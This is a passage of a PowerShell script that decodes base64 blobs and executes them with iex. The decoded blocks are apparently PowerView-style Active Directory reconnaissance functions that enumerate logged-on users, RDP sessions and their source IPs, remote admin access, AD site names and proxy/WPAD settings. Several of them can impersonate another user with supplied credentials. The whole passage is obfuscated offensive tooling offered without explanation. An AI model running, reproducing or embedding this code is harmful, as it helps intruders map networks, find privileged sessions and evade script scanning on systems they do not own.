vc29mdC5XaW4zMi5SZWdpc3RyeUtleV06Ok9wZW5SZW1vdGVCYXNlS2V5KCdVc2VycycsICIkQ29tcHV0ZXJOYW1lIikKICAgICAgICAgICAgICAgICRSZWcuR2V0U3ViS2V5TmFtZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfIC1tYXRjaCAnUy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJCcgfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNJRCAkXyAtT3V0cHV0VHlwZSAnRG9tYWluU2ltcGxlJwogICAgICAgICAgICAgICAgICAgIGlmICgkVXNlck5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lLCAkVXNlckRvbWFpbiA9ICRVc2VyTmFtZS5TcGxpdCgnQCcpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkXwogICAgICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRSZWdMb2dnZWRPblVzZXIgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJFJlZ0xvZ2dlZE9uVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICIkQ29tcHV0ZXJOYW1lIgogICAgICAgICAgICAgICAgICAgICRSZWdMb2dnZWRPblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlckRvbWFpbicgJFVzZXJEb21haW4KICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJOYW1lJyAkVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJTSUQnICRfCiAgICAgICAgICAgICAgICAgICAgJFJlZ0xvZ2dlZE9uVXNlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuUmVnTG9nZ2VkT25Vc2VyJykKICAgICAgICAgICAgICAgICAgICAkUmVnTG9nZ2VkT25Vc2VyCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1SZWdMb2dnZWRPbl0gRXJyb3Igb3BlbmluZyByZW1vdGUgcmVnaXN0cnkgb24gJyRDb21wdXRlck5hbWUnIDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldFJEUFNlc3Npb24gewogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5SRFBTZXNzaW9uSW5mbycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkSGFuZGxlID0gJFd0c2FwaTMyOjpXVFNPcGVuU2VydmVyRXgoJENvbXB1dGVyKQogICAgICAgICAgICBpZiAoJEhhbmRsZSAtbmUgMCkgewogICAgICAgICAgICAgICAgJHBwU2Vzc2lvbkluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgJHBDb3VudCA9IDAKICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkV3RzYXBpMzI6OldUU0VudW1lcmF0ZVNlc3Npb25zRXgoJEhhbmRsZSwgW3JlZl0xLCAwLCBbcmVmXSRwcFNlc3Npb25JbmZvLCBbcmVmXSRwQ291bnQpOyRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkcHBTZXNzaW9uSW5mby5Ub0ludDY0KCkKICAgICAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtbmUgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKICAgICAgICAgICAgICAgICAgICAkSW5jcmVtZW50ID0gJFdUU19TRVNTSU9OX0lORk9fMTo6R2V0U2l6ZSgpCiAgICAgICAgICAgICAgICAgICAgZm9yICgkaSA9IDA7ICgkaSAtbHQgJHBDb3VudCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE5ld0ludFB0ciA9IE5ldy1PYmplY3QgU3lzdGVtLkludHB0ciAtQXJndW1lbnRMaXN0ICRPZmZzZXQKICAgICAgICAgICAgICAgICAgICAgICAgJEluZm8gPSAkTmV3SW50UHRyIC1hcyAkV1RTX1NFU1NJT05fSU5GT18xCiAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEluZm8ucEhvc3ROYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRJbmZvLnBIb3N0TmFtZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTZXNzaW9uTmFtZScgJEluZm8ucFNlc3Npb25OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkKC1ub3QgJEluZm8ucERvbWFpbk5hbWUpIC1vciAoJEluZm8ucERvbWFpbk5hbWUgLWVxICcnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICIkKCRJbmZvLnBVc2VyTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgIiQoJEluZm8ucERvbWFpbk5hbWUpXCQoJEluZm8ucFVzZXJOYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkUkRQU2Vzc2lvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJRCcgJEluZm8uU2Vzc2lvbklECiAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1N0YXRlJyAkSW5mby5TdGF0ZQogICAgICAgICAgICAgICAgICAgICAgICAkcHBCdWZmZXIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgICAgICAgICAkcEJ5dGVzUmV0dXJuZWQgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHQyID0gJFd0c2FwaTMyOjpXVFNRdWVyeVNlc3Npb25JbmZvcm1hdGlvbigkSGFuZGxlLCAkSW5mby5TZXNzaW9uSUQsIDE0LCBbcmVmXSRwcEJ1ZmZlciwgW3JlZl0kcEJ5dGVzUmV0dXJuZWQpOyRMYXN0RXJyb3IyID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0MiAtZXEgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yMikuTWVzc2FnZSkiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0MiA9ICRwcEJ1ZmZlci5Ub0ludDY0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXdJbnRQdHIyID0gTmV3LU9iamVjdCBTeXN0ZW0uSW50cHRyIC1Bcmd1bWVudExpc3QgJE9mZnNldDIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbmZvMiA9ICROZXdJbnRQdHIyIC1hcyAkV1RTX0NMSUVOVF9BRERSRVNTCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlSVAgPSAkSW5mbzIuQWRkcmVzcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRTb3VyY2VJUFsyXSAtbmUgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTb3VyY2VJUCA9IFtTdHJpbmddJFNvdXJjZUlQWzJdKycuJytbU3RyaW5nXSRTb3VyY2VJUFszXSsnLicrW1N0cmluZ10kU291cmNlSVBbNF0rJy4nK1tTdHJpbmddJFNvdXJjZUlQWzVdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU291cmNlSVAgPSAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU291cmNlSVAnICRTb3VyY2VJUAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJEUFNlc3Npb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlJEUFNlc3Npb25JbmZvJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSRFBTZXNzaW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRXdHNhcGkzMjo6V1RTRnJlZU1lbW9yeSgkcHBCdWZmZXIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ICs9ICRJbmNyZW1lbnQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRXdHNhcGkzMjo6V1RTRnJlZU1lbW9yeUV4KDIsICRwcFNlc3Npb25JbmZvLCAkcENvdW50KQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICROdWxsID0gJFd0c2FwaTMyOjpXVFNDbG9zZVNlcnZlcigkSGFuZGxlKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRSRFBTZXNzaW9uXSBFcnJvciBvcGVuaW5nIHRoZSBSZW1vdGUgRGVza3RvcCBTZXNzaW9uIEhvc3QgKFJEIFNlc3Npb24gSG9zdCkgc2VydmVyIGZvcjogJENvbXB1dGVyTmFtZSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgaWYgKCRMb2dvblRva2VuKSB7CiAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYgLVRva2VuSGFuZGxlICRMb2dvblRva2VuCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gVGVzdC1BZG1pbkFjY2VzcyB7CiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkFkbWluQWNjZXNzJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAkTG9nb25Ub2tlbiA9IEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICRIYW5kbGUgPSAkQWR2YXBpMzI6Ok9wZW5TQ01hbmFnZXJXKCJcXCRDb21wdXRlciIsICdTZXJ2aWNlc0FjdGl2ZScsIDB4RjAwM0YpOyRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICAgICAgJElzQWRtaW4gPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICRJc0FkbWluIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgIGlmICgkSGFuZGxlIC1uZSAwKSB7CiAgICAgICAgICAgICAgICAkTnVsbCA9ICRBZHZhcGkzMjo6Q2xvc2VTZXJ2aWNlSGFuZGxlKCRIYW5kbGUpCiAgICAgICAgICAgICAgICAkSXNBZG1pbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJc0FkbWluJyAkVHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1Rlc3QtQWRtaW5BY2Nlc3NdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgJElzQWRtaW4gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNBZG1pbicgJEZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJElzQWRtaW4uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkFkbWluQWNjZXNzJykKICAgICAgICAgICAgJElzQWRtaW4KICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUgewogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Db21wdXRlclNpdGUnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgaWYgKCRDb21wdXRlciAtbWF0Y2ggJ14oPzpbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfSQnKSB7CiAgICAgICAgICAgICAgICAkSVBBZGRyZXNzID0gJENvbXB1dGVyCiAgICAgICAgICAgICAgICAkQ29tcHV0ZXIgPSBbU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0QnlBZGRyZXNzKCRDb21wdXRlcikgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBIb3N0TmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJElQQWRkcmVzcyA9IEAoUmVzb2x2ZS1JUEFkZHJlc3MgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXIpWzBdLklQQWRkcmVzcwogICAgICAgICAgICB9CiAgICAgICAgICAgICRQdHJJbmZvID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6RHNHZXRTaXRlTmFtZSgkQ29tcHV0ZXIsIFtyZWZdJFB0ckluZm8pCiAgICAgICAgICAgICRDb21wdXRlclNpdGUgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICRDb21wdXRlclNpdGUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgJENvbXB1dGVyU2l0ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJUEFkZHJlc3MnICRJUEFkZHJlc3MKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWVxIDApIHsKICAgICAgICAgICAgICAgICRTaXRlbmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQXV0bygkUHRySW5mbykKICAgICAgICAgICAgICAgICRDb21wdXRlclNpdGUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2l0ZU5hbWUnICRTaXRlbmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRDb21wdXRlclNpdGVOYW1lXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICRDb21wdXRlclNpdGUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2l0ZU5hbWUnICcnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJENvbXB1dGVyU2l0ZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQ29tcHV0ZXJTaXRlJykKICAgICAgICAgICAgJE51bGwgPSAkTmV0YXBpMzI6Ok5ldEFwaUJ1ZmZlckZyZWUoJFB0ckluZm8pCiAgICAgICAgICAgICRDb21wdXRlclNpdGUKICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVJlZ1Byb3h5IHsKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuUHJveHlTZXR0aW5ncycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAkRW52OkNPTVBVVEVSTkFNRSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkV21pQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICAgICAnTGlzdCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICdDbGFzcycgPSAnU3RkUmVnUHJvdicKICAgICAgICAgICAgICAgICAgICAnTmFtZXNwYWNlJyA9ICdyb290XGRlZmF1bHQnCiAgICAgICAgICAgICAgICAgICAgJ0NvbXB1dGVybmFtZScgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1N0b3AnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFdtaUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAgICAgJFJlZ1Byb3ZpZGVyID0gR2V0LVdtaU9iamVjdCBAV21pQXJndW1lbnRzCiAgICAgICAgICAgICAgICAkS2V5ID0gJ1NPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEludGVybmV0IFNldHRpbmdzJwogICAgICAgICAgICAgICAgJEhLQ1UgPSAyMTQ3NDgzNjQ5CiAgICAgICAgICAgICAgICAkUHJveHlTZXJ2ZXIgPSAkUmVnUHJvdmlkZXIuR2V0U3RyaW5nVmFsdWUoJEhLQ1UsICRLZXksICdQcm94eVNlcnZlcicpLnNWYWx1ZQogICAgICAgICAgICAgICAgJEF1dG9Db25maWdVUkwgPSAkUmVnUHJvdmlkZXIuR2V0U3RyaW5nVmFsdWUoJEhLQ1UsICRLZXksICdBdXRvQ29uZmlnVVJMJykuc1ZhbHVlCiAgICAgICAgICAgICAgICAkV3BhZCA9ICcnCiAgICAgICAgICAgICAgICBpZiAoJEF1dG9Db25maWdVUkwgLWFuZCAoJEF1dG9Db25maWdVUkwgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRXcGFkID0gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJEF1dG9Db25maWdVUkwpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1XTUlSZWdQcm94eV0gRXJyb3IgY29ubmVjdGluZyB0byBBdXRvQ29uZmlnVVJMIDogJEF1dG9Db25maWdVUkwiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQcm94eVNlcnZlciAtb3IgJEF1dG9Db25maWdVcmwpIHsKICAgICAgICAgICAgICAgICAgICAkT3V0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb3h5U2VydmVyJyAkUHJveHlTZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0F1dG9Db25maWdVUkwnICRBdXRvQ29uZmlnVVJMCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdXcGFkJyAkV3BhZAogICAgICAgICAgICAgICAgICAgICRPdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlByb3h5U2V0dGluZ3MnKQogICAgICAgICAgICAgICAgICAgICRPdXQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnUHJveHldIE5vIHByb3h5IHNldHRpbmdzIGZvdW5kIGZvciAkQ29tcHV0ZXJOYW1lIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnUHJveHldIEVycm9yIGVudW1lcmF0aW5nIHByb3h5IHNldHRpbmdzIGZvciAkQ29tcHV0ZXJOYW